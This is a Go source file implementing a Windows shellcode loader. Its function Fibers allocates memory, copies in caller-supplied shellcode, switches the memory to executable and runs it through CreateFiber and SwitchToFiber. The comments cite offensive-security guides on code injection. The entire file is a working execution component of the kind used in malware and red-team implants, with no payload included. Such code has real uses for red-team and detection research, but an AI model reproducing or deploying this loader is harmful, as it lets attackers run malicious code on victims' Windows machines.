package shellcode

/*

References:
https://ired.team/offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber
https://github.com/Ne0nd0g/go-shellcode/blob/master/cmd/CreateFiber/main.go

*/

import (
  "unsafe"
  "errors"
  "fmt"
  //"log"

  "golang.org/x/sys/windows"
)

const (
  // MEM_COMMIT is a Windows constant used with Windows API calls
  MEM_COMMIT = 0x1000
	
  // MEM_RESERVE is a Windows constant used with Windows API calls
  MEM_RESERVE = 0x2000
	
  // PAGE_EXECUTE_READ is a Windows constant used with Windows API calls
  PAGE_EXECUTE_READ = 0x20
  
  // PAGE_READWRITE is a Windows constant used with Windows API calls
  PAGE_READWRITE = 0x04
)

func Fibers(shellcode []byte) (error) {

  kernel32 := windows.NewLazySystemDLL("kernel32.dll")
  ntdll := windows.NewLazySystemDLL("ntdll.dll")

  VirtualAlloc := kernel32.NewProc("VirtualAlloc")
  VirtualProtect := kernel32.NewProc("VirtualProtect")
  RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
  ConvertThreadToFiber := kernel32.NewProc("ConvertThreadToFiber")
  CreateFiber := kernel32.NewProc("CreateFiber")
  SwitchToFiber := kernel32.NewProc("SwitchToFiber")

  fiberAddr, _, errConvertFiber := ConvertThreadToFiber.Call() // Convert thread to fiber
  if errConvertFiber != nil {
    fmt.Println(errConvertFiber.Error())
  }

  // Allocate shellcode
  addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
  if errVirtualAlloc != nil {
    fmt.Println(errVirtualAlloc.Error())
  }

  if addr == 0 {
    return errors.New("VirtualAlloc failed and returned 0")
  }

  // Copy shellcode to memory
  _, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
  if errRtlCopyMemory != nil {
    fmt.Println(errRtlCopyMemory.Error())
  }

  oldProtect := PAGE_READWRITE
  // Change memory region to PAGE_EXECUTE_READ
  _, _, errVirtualProtect := VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
  if errVirtualProtect != nil {
    fmt.Println(errVirtualProtect.Error())
  }

  // Create fiber
  fiber, _, errCreateFiber := CreateFiber.Call(0, addr, 0)
  if errCreateFiber != nil {
    fmt.Println(errCreateFiber)
  }

  _, _, errSwitchToFiber := SwitchToFiber.Call(fiber)
  if errSwitchToFiber != nil {
    fmt.Println(errSwitchToFiber.Error())
  }

  _, _, errSwitchToFiber2 := SwitchToFiber.Call(fiberAddr)
  if errSwitchToFiber2 != nil {
    fmt.Println(errSwitchToFiber2.Error())
  }

  return nil
}





